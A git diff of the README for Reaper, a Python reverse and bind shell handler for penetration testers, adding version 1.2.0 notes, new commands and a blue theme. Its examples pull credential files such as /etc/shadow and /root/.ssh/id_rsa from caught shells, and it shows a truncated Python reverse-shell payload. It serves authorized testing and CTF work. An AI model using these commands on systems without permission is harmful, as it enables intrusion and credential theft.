@@ -1,56 +1,70 @@
 # Reaper
 
-![Python](https://img.shields.io/badge/python-3.9+-blueviolet?style=for-the-badge&logo=python&logoColor=white)
-![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
+![Python](https://img.shields.io/badge/python-3.9+-2f81f7?style=for-the-badge&logo=python&logoColor=white)
+![Linux](https://img.shields.io/badge/Linux-1f6feb?style=for-the-badge&logo=linux&logoColor=white)
 ![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
-![Version](https://img.shields.io/badge/version-1.1.0-crimson?style=for-the-badge)
+![Version](https://img.shields.io/badge/version-1.2.0-2f81f7?style=for-the-badge)
 
-**Reaper** is a multi-session reverse/bind shell handler built for pentesters.
+Reaper is a multi-session reverse and bind shell handler for pentesters and CTF players. You start it, it listens, and when a shell calls back it figures out what it is talking to, upgrades the shell to a real PTY, and hands it to you ready to use. Think of it as a comfortable home for all the shells you catch during an engagement, so you are not juggling a pile of raw netcat windows.
+
+If you have used [Penelope](https://github.com/brightio/penelope), the idea will feel familiar. Reaper aims for the same "it just works when the shell lands" experience, with a small, readable codebase and a module system you can extend.
+
+```
+  ☠  #1  10.10.14.5:44321  →  :4444  [ linux ]  root@target
+  ✓  Shell #1 auto-upgraded to PTY.
+
+kali@reaper(1 session) ❯ go 1
+```
 
 ---
 
-## What's new in 1.1
+## What changed in 1.2.0
 
-- **Sessions now show which listener port received them** — when you run
-  several listeners (`-p 4444,5555,9001`) and a shell pops in, the
-  notification and `ls` clearly tag the local port so you can tell shells
-  apart at a glance.
-- **Auto-grabbed `user@host` identity** appended to the notification and
-  `ls` output, so you remember *what* the shell is, not just where it came
-  from.
-- **Windows session logs decode with the negotiated encoding** (`cp1252`),
-  no more mojibake in `~/.reaper/logs/`.
-- **Bind-shell mode no longer races the watchdog thread** — disconnects on
-  `reaper -c` sessions are detected from the first second.
-- **ConPtyShell pending-state cleanup** when the callback never arrives.
-- **Misc cleanup** — unused colour wrapper removed from `notify()`,
-  wake-up pipe FDs closed on `stop()`.
+This release is mostly about one thing: **the interactive shell now actually works when you type into it.**
+
+- **Fixed the frozen-input bug.** A background watchdog thread was reading one
+  byte off every session socket to check if it was still alive. While you were
+  attached to a shell, that thread and the interactive reader were fighting over
+  the same stream, so it stole characters out of the shell's output. The result
+  was a shell that felt frozen, dropped keystrokes, or corrupted whatever you
+  typed. The watchdog now peeks at the socket without consuming anything
+  (`MSG_PEEK`), so every byte reaches your terminal. Typing works.
+- **Window resizing no longer eats output.** Resizing your terminal during a
+  session used to drain bytes from the socket. It now just forwards the new size.
+- **One bad command cannot take the whole tool down.** Every command runs inside
+  a guard, so a typo or an unexpected error prints a message and drops you back
+  at the prompt instead of crashing Reaper.
+- **New blue theme.** The whole interface moved from red/orange to a cool steel
+  blue palette that stays readable on a dark terminal. Errors stay red on
+  purpose, so they still stand out.
+- **New commands:** `killall`, `name`, and `go` with no id (see below).
+
+Full details are in the [Changelog](#changelog).
 
 ---
 
 ## Features
 
-| Feature | Details |
+| Feature | What it does |
 |---|---|
-| **Multi-session** | Handle unlimited shells simultaneously. List, switch, and background sessions. |
-| **Multi-listener** | Bind to multiple ports at once (`-p 4444,5555,9001`). |
-| **Live port management** | Add or remove ports while running,  no restart needed. |
-| **Auto PTY upgrade** | Shell is upgraded to full PTY automatically,no manual upgrade needed. |
-| **Windows support** | Upgrades PowerShell/CMD via ConPtyShell automatically. |
-| **Session logging** | Every session logged automatically to `~/.reaper/logs/`. |
-| **File upload** | Push local files to the target over TCP. |
-| **File download** | Pull files or entire directories from the target. |
-| **HTTP file server** | `reaper -s ./tools` or `serve .` from the prompt. |
-| **Bind shell** | `reaper -c <target>` to connect outward to a bind shell. |
-| **Payload generation** | Built-in payloads for bash, python, php, perl, ruby, nc, socat, powershell and more. |
-| **Module system** | Extensible modules with hot-reload (`reload`). |
-| **Tab completion** | Context-aware completes commands, session IDs, module names, interfaces, ports. |
-| **Screenable mode** | Hidden command that redacts IPs for sharing screenshots. |
-| **Clean signals** | `Ctrl+Z` backgrounds a session. `Ctrl+C` forwards SIGINT to the remote. |
+| Multi-session | Catch and manage as many shells as you want at once. List them, jump between them, background them. |
+| Multi-listener | Listen on several ports at the same time (`-p 4444,5555,9001`). |
+| Live port management | Add or drop listening ports while running. No restart. |
+| Auto PTY upgrade | Linux shells get upgraded to a full PTY automatically the moment they land. |
+| Windows support | PowerShell and CMD shells get upgraded through ConPtyShell for a real interactive experience. |
+| Session logging | Every session is written to `~/.reaper/logs/` so you have a record of everything. |
+| File upload and download | Push files to the target or pull files (and whole directories) back, over a side TCP channel. |
+| HTTP file server | Serve a file or folder with `reaper -s ./tools` or `serve .` from inside the prompt. |
+| Bind shell mode | Connect outward to a listening target with `reaper -c <host>`. |
+| Payload generation | Ready-to-paste reverse shells for bash, sh, python, php, perl, ruby, nc, socat, and PowerShell. |
+| Module system | Small, hot-reloadable modules. Write your own and drop them in. |
+| Tab completion | Context aware. Completes commands, session ids, module names, interfaces, and ports. |
+| Screenable mode | A hidden toggle that redacts IPs so you can share screenshots safely. |
+| Clean signals | `Ctrl+Z` backgrounds a session. `Ctrl+C` goes to the remote process, not to Reaper. |
 
 ---
 
-## Installation
+## Install
 
 ```bash
 git clone https://github.com/z3r0s6/Reaper
@@ -58,27 +72,52 @@ cd Reaper
 pipx install --editable .
 ```
 
+That gives you a `reaper` command on your PATH. If you do not use pipx, a plain
+`pip install --user .` works too.
+
+Requirements: Python 3.9 or newer. Reaper runs from a Linux operator box (Kali,
+Parrot, or any Linux). Targets can be Linux or Windows.
+
 ---
 
-## Usage
+## Quick start
+
+Open two terminals and try it against yourself first.
+
+```bash
+# Terminal 1: start Reaper on the default port 4444
+reaper
+```
+
+```bash
+# Terminal 2: pretend to be a target and call back
+nc 127.0.0.1 4444
+```
+
+Back in Terminal 1 you will see a new session pop up. Attach to it:
+
+```
+kali@reaper(1 session) ❯ go 1
+```
+
+Type `exit` inside the shell or hit `Ctrl+Z` to come back to the Reaper prompt.
+
+---
+
+## Command-line usage
 
 ### Start a listener
 
 ```bash
-# Default: 0.0.0.0:4444
-reaper
-
-# Custom port
-reaper -p 9001
-
-# Multiple ports at startup
-reaper -p 4444,5555,9001
-
-# Bind to a specific interface
-reaper -i tun0 -p 4444
+reaper                      # listen on 0.0.0.0:4444
+reaper -p 9001              # one custom port
+reaper -p 4444,5555,9001    # several ports at once
+reaper -i 10.10.14.5 -p 443 # bind to a specific address
 ```
 
 ### Connect to a bind shell
+
+When the target is listening and you connect to it:
 
 ```bash
 reaper -c 10.10.10.50 -p 4444
@@ -87,105 +126,67 @@ reaper -c 10.10.10.50 -p 4444
 ### Serve files over HTTP
 
 ```bash
-# Serve current directory on :8000
-reaper -s .
-
-# Serve a specific file on a custom port
+reaper -s .                                  # serve the current folder on :8000
 reaper -s /opt/tools/linpeas.sh --serve-port 9090
 ```
 
-### Show payloads for an interface
+### Print payloads without starting a listener
 
 ```bash
-reaper -a tun0
-reaper -a eth0
+reaper -a               # payloads for every interface
+reaper -a tun0          # payloads for one interface
+reaper -a tun0 -p 443   # tailor the port shown in the payloads
 ```
 
-### Disable session logging
+### Logging options
 
 ```bash
-reaper -L
-reaper --log-dir /tmp/reaper-logs
+reaper -L                       # turn session logging off
+reaper --log-dir /tmp/reaper    # write logs somewhere else
 ```
 
-### Quick test (local)
-
-Open two terminals:
+### Everything at a glance
 
 ```bash
-# Terminal 1  start Reaper
-reaper
-
-# Terminal 2  connect a test shell
-nc 127.0.0.1 4444
+reaper -h
 ```
-
-A session will appear in Terminal 1. Type `go 1` to interact with it.
 
 ---
 
-## How it works
+## Working inside the prompt
 
-When a shell connects Reaper automatically:
-1. Detects the remote OS
-2. Grabs `user@host` for identification
-3. Upgrades the shell to a full PTY (Linux) / ConPtyShell (Windows)
-4. Notifies you it's ready
+Once Reaper is running you get an interactive prompt. Here is the full command set.
 
-```
-  [☠]  #1  10.10.14.5:44321  →  :4444  [ linux ]  root@target
-  [✓]  Shell #1 auto-upgraded to PTY.
-```
+### Sessions
 
-The `→  :4444` is the **local listener port** that received the shell —
-critical when you're listening on several ports for several targets.
-
-Just type `go 1` and you're in.
-
----
-
-## Shell Commands
-
-### Session management
-
-| Command | Description |
+| Command | What it does |
 |---|---|
-| `ls` | List all sessions |
-| `go <id>` | Interact with a session |
-| `upgrade <id>` | Manually upgrade shell to PTY |
-| `kill <id>` | Terminate a session |
-| `log <id>` | Show log file path for a session |
-
-### Port management
-
-| Command | Description |
-|---|---|
-| `listeners` | List all active listeners |
-| `addport <port>` | Start listening on a new port (no restart needed) |
-| `rmport <port>` | Stop listening on a port |
+| `ls` | List every session, with OS, source, and uptime. |
+| `go [id]` | Attach to a session. With no id, attaches to the only live one. |
+| `upgrade <id>` | Manually upgrade a shell to a PTY (Linux) or ConPtyShell (Windows). |
+| `name <id> <label>` | Give a session a friendly label so `ls` is easier to read. |
+| `kill <id>` | Close one session. |
+| `killall` | Close every session (asks first). |
+| `log <id>` | Print the log file path for a session. |
 
 ```
-reaper❯ addport 9001
-  [✓]  Now listening on port 9001.
+kali@reaper(2 sessions) ❯ ls
 
-reaper❯ rmport 9001
-  [✓]  Stopped listening on port 9001.
+kali@reaper(2 sessions) ❯ name 1 web-box
+  ✓  Session #1 labelled web-box.
+
+kali@reaper(2 sessions) ❯ go 1        # jump in
+kali@reaper(2 sessions) ❯ go          # or just 'go' if there is only one
 ```
 
-> `rmport` will refuse to remove the last remaining listener.
+### Payloads
 
-### Payload generation
-
-Requires an interface name:
-
-```
-reaper❯ payloads tun0
-reaper❯ payloads eth0
-```
-
-Each payload is displayed with its name and command on separate lines for easy copying:
+Give it an interface name and it prints copy-paste reverse shells pointed back
+at that interface:
 
 ```
+kali@reaper(0 sessions) ❯ payloads tun0
+
 ════════════════════════════════════════════
   ☠  tun0  →  10.10.14.5:4444
 ────────────────────────────────────────────
@@ -197,146 +198,184 @@ Each payload is displayed with its name and command on separate lines for easy c
       python3 -c 'import os,pty,socket;...'
 ```
 
+Run `payloads` with no interface to see which ones are available.
+
 ### Modules
 
 ```
-reaper❯ modules
-reaper❯ run sysinfo 1
-reaper❯ run upload 1 /local/file.sh /tmp/file.sh
-reaper❯ run download 1 /etc/passwd
-reaper❯ run download_dir 1 /etc
-reaper❯ run linpeas 1
-reaper❯ run linpeas 1 -o /tmp/output.txt
-reaper❯ reload
+kali@reaper ❯ modules                              # list what is loaded
+kali@reaper ❯ run sysinfo 1                         # enumerate the target
+kali@reaper ❯ run upload 1 ./linpeas.sh /tmp/lp.sh  # push a file
+kali@reaper ❯ run download 1 /etc/passwd            # pull a file
+kali@reaper ❯ run download_dir 1 /etc ./etc.tar.gz  # pull a whole folder
+kali@reaper ❯ run linpeas 1                         # run linpeas in memory
+kali@reaper ❯ run linpeas 1 -o ./linpeas-out.txt    # and save the output
+kali@reaper ❯ reload                                # hot-reload modules after editing
 ```
 
-### HTTP server (from main menu)
+### Listeners and ports
 
 ```
-reaper❯ serve /opt/tools 8888
-reaper❯ serve .
-reaper❯ stopserve
+kali@reaper ❯ listeners        # show active listeners
+kali@reaper ❯ addport 9001     # start listening on another port, live
+  ✓  Now listening on port 9001.
+kali@reaper ❯ rmport 9001      # stop listening on a port
+  ✓  Stopped listening on port 9001.
 ```
 
-### Misc
+### HTTP file server
 
 ```
-reaper❯ listeners
-reaper❯ help
-reaper❯ exit
+kali@reaper ❯ serve .              # serve current dir on :8000
+kali@reaper ❯ serve /opt/tools 8888
+kali@reaper ❯ stopserve
+```
+
+### Everything else
+
+```
+kali@reaper ❯ clear    # clear the screen
+kali@reaper ❯ help     # full help
+kali@reaper ❯ exit     # close all sessions and quit cleanly
 ```
 
 ---
 
-## Key Bindings (inside a session)
+## Keys inside a session
 
 | Key | Action |
 |---|---|
-| `Ctrl+Z` | Background session, return to main menu |
-| `Ctrl+C` | Send SIGINT to the remote process |
+| `Ctrl+Z` | Background the session and return to the Reaper prompt. |
+| `Ctrl+C` | Send an interrupt to the remote process (not to Reaper). |
+
+Backgrounding never kills the shell. It stays open and shows up in `ls`, ready
+for you to `go` back into it later.
 
 ---
 
-## Tab Completion
+## Tab completion
 
-The prompt is fully context-aware:
+The prompt knows what you are in the middle of typing:
 
-| What you type | Tab completes |
+| You are typing | Tab gives you |
 |---|---|
-| `go ` | active session IDs |
-| `upgrade ` | active session IDs |
-| `kill ` | active session IDs |
-| `log ` | active session IDs |
+| the first word | every command |
+| `go `, `upgrade `, `kill `, `log ` | live session ids |
 | `run ` | module names |
-| `run <mod> ` | active session IDs |
-| `payloads ` | network interfaces |
-| `rmport ` | active listening ports |
-| *(first word)* | all commands |
+| `run <module> ` | live session ids |
+| `payloads ` | your network interfaces |
+| `rmport ` | ports you are currently listening on |
 
 ---
 
-## Writing Custom Modules
+## How a session comes to life
 
-See [MODULES.md](MODULES.md) for the full guide.
+When a shell connects, Reaper does the boring setup for you:
 
-Quick example:
+1. Sends a quiet probe and reads the reply to work out the OS and shell type.
+2. Grabs `user@host` so the notification tells you who and where.
+3. Upgrades the shell: a real PTY on Linux, ConPtyShell on Windows.
+4. Tells you it is ready.
+
+```
+  ☠  #1  10.10.14.5:44321  →  :4444  [ linux ]  root@target
+  ✓  Shell #1 auto-upgraded to PTY.
+```
+
+That `→ :4444` is the local port the shell landed on. When you are listening on
+several ports for several targets, it is the fastest way to tell your shells
+apart. Type `go 1` and you are in.
+
+---
+
+## File transfer, in detail
+
+Transfers do not go over the interactive shell. Reaper spins up a short-lived
+TCP channel on your box and tells the target to read from or write to it, so
+large files move cleanly and your prompt stays usable.
+
+```
+# Upload: local file  ->  target
+kali@reaper ❯ run upload 1 /home/kali/tools/linpeas.sh /tmp/linpeas.sh
+
+# Download: target file  ->  local
+kali@reaper ❯ run download 1 /etc/shadow
+kali@reaper ❯ run download 1 /root/.ssh/id_rsa ./loot/id_rsa
+
+# Download a whole directory as a tar.gz
+kali@reaper ❯ run download_dir 1 /etc ./loot/etc.tar.gz
+```
+
+Upload verifies the size on the far end and warns you if it does not match.
+
+---
+
+## Session logs
+
+Everything you see in a session is written to disk:
+
+```
+~/.reaper/logs/session_<id>_<ip>_<timestamp>.log
+```
+
+Find the exact path for a session:
+
+```
+kali@reaper ❯ log 1
+  ·  Session #1 log: /home/kali/.reaper/logs/session_1_10.10.14.5_20260712_120000.log
+```
+
+Turn logging off with `reaper -L`, or point it elsewhere with `--log-dir`.
+
+---
+
+## Screenable mode
+
+If you are recording a demo or sharing a screenshot, this hides every IP behind
+`<REDACTED>`. It is a hidden toggle, not shown in help or completion:
+
+```
+kali@reaper ❯ _reaper_screenable_
+  ·  Screenable mode ON
+```
+
+Run it again to turn it off.
+
+---
+
+## Writing your own module
+
+A module is a small class. Drop the file in `src/reaper/modules/` and run
+`reload`, no restart needed. Full guide in [MODULES.md](MODULES.md).
 
 ```python
 from reaper.modules.blueprint import ReaperModule
 
 class MyModule(ReaperModule):
     name        = "my_module"
-    description = "Does something cool."
+    description = "Does something useful."
     category    = "Enumeration"
-    platform    = ["linux"]
+    platform    = ["linux"]          # or "any", or ["windows_ps"], etc.
 
     def run(self) -> None:
         result = self.exec("whoami")
         self.ok(f"Running as: {result.stdout.strip()}")
 ```
 
-Drop the file in `src/reaper/modules/` and hot-reload:
+Then:
 
 ```
-reaper❯ reload
+kali@reaper ❯ reload
+kali@reaper ❯ run my_module 1
 ```
+
+Inside a module you get helpers like `self.exec()` for command-and-collect,
+`self.exec_stream()` for live output, upload and download plumbing, and the same
+notification helpers Reaper uses (`self.ok`, `self.err`, `self.warn`).
 
 ---
 
-## File Transfer
-
-### Upload (local → remote)
-
-```
-reaper❯ run upload 1 /home/kali/tools/linpeas.sh /tmp/linpeas.sh
-```
-
-### Download (remote → local)
-
-```
-reaper❯ run download 1 /etc/shadow
-reaper❯ run download 1 /root/.ssh/id_rsa ./loot/id_rsa
-```
-
-### Download entire directory
-
-```
-reaper❯ run download_dir 1 /etc ./loot/etc.tar.gz
-```
-
----
-
-## Session Logs
-
-Logs are written automatically to `~/.reaper/logs/`:
-
-```
-session_<id>_<ip>_<timestamp>.log
-```
-
-Find the log path for a session:
-
-```
-reaper❯ log 1
-  [·]  Session #1 log: /home/kali/.reaper/logs/session_1_10.10.14.5_20260101_120000.log
-```
-
----
-
-## Screenable Mode
-
-Redacts all IP addresses for sharing screenshots or recordings.
-
-```
-reaper❯ _reaper_screenable_
-  [·]  Screenable mode ON
-```
-
-Hidden from help and tab completion.
-
----
-
-## Project Structure
+## Project layout
 
 ```
 Reaper/
@@ -345,44 +384,65 @@ Reaper/
 ├── pyproject.toml
 └── src/
     └── reaper/
-        ├── main.py          # CLI entry point & argument parsing
-        ├── listener.py      # Core listener, session management, command loop
-        ├── session.py       # Session model, logging, RawTerminal
+        ├── main.py          # entry point and argument parsing
+        ├── listener.py      # listener, sessions, the command loop, interaction
+        ├── session.py       # Session model, logging, raw terminal handling
         ├── detect.py        # OS auto-detection
-        ├── cli.py           # Help text
+        ├── cli.py           # help text
         ├── server.py        # HTTP file server
         ├── models.py        # CommandResult, StreamLine
         ├── modules/
         │   ├── blueprint.py # ReaperModule base class
-        │   ├── loader.py    # Dynamic module loader (hot-reload)
-        │   ├── sysinfo.py   # System enumeration
-        │   ├── upload.py    # File upload (local → remote)
-        │   ├── download.py  # File download + directory archive
+        │   ├── loader.py    # module loader with hot-reload
+        │   ├── sysinfo.py   # system enumeration
+        │   ├── upload.py    # file upload
+        │   ├── download.py  # file and directory download
         │   └── linpeas.py   # LinPEAS in-memory runner
         └── utils/
-            ├── ui.py        # Colors, ASCII art, notifications, spinner, boxes
-            ├── tcp.py       # TCP one-shot send/recv servers
-            └── payloads.py  # Reverse-shell payload generator
+            ├── ui.py        # colors, ASCII art, notifications, spinner, boxes
+            ├── tcp.py       # one-shot TCP send/recv helpers
+            └── payloads.py  # reverse shell payload generator
 ```
 
 ---
 
 ## Changelog
 
+### 1.2.0
+
+- Fix: the interactive session no longer freezes or drops keystrokes. The
+  liveness watchdog used to `recv(1)` off the socket, stealing bytes from the
+  shell you were attached to. It now peeks with `MSG_PEEK` and consumes nothing.
+- Fix: window resize (`SIGWINCH`) during a session no longer drains bytes from
+  the socket. It only forwards the new terminal size now.
+- Fix: a failing command prints an error and returns to the prompt instead of
+  crashing the whole handler.
+- Fix: `serve` with a non-numeric port reports the mistake instead of raising.
+- New: `killall` closes every session at once.
+- New: `name <id> <label>` puts a friendly label on a session.
+- New: `go` with no id attaches to the only live session.
+- Change: new steel-blue theme, tuned for dark terminals. Errors stay red.
+- Change: version bumped to 1.2.0 across the package.
+
 ### 1.1.0
 
-- New: each `Session` carries the local listener port that received it.
-- New: notification + `ls` show `→ :PORT` and `user@host` identity.
-- New: `detect.fetch_identity()` runs after OS detection (Linux / cmd / PowerShell).
-- Fix: session log decoding now uses the session's negotiated encoding
-  (no more garbled Windows logs).
-- Fix: `BindConnector.connect()` flips `_running = True` so the watchdog
-  thread starts immediately for `reaper -c` shells.
-- Fix: stale `_pending_conpty` markers are cleared when ConPtyShell
-  doesn't connect back.
-- Fix: wake-up pipe file descriptors closed in `Listener.stop()`.
-- Cleanup: dead colour-wrapper code removed from `notify()`.
+- New: each session carries the local listener port that received it.
+- New: notification and `ls` show `→ :PORT` and the `user@host` identity.
+- New: identity capture after OS detection (Linux, cmd, PowerShell).
+- Fix: session logs decode with the session's negotiated encoding, so Windows
+  logs are no longer garbled.
+- Fix: bind-shell mode starts its watchdog immediately.
+- Fix: stale ConPtyShell state is cleared when the callback never arrives.
+- Fix: wake-up pipe descriptors are closed on shutdown.
 
 ### 0.1.0
 
 - Initial release.
+
+---
+
+## Legal
+
+Reaper is for authorized security testing, CTFs, and lab work only. Use it only
+against systems you own or have explicit written permission to test. What you do
+with it is on you.
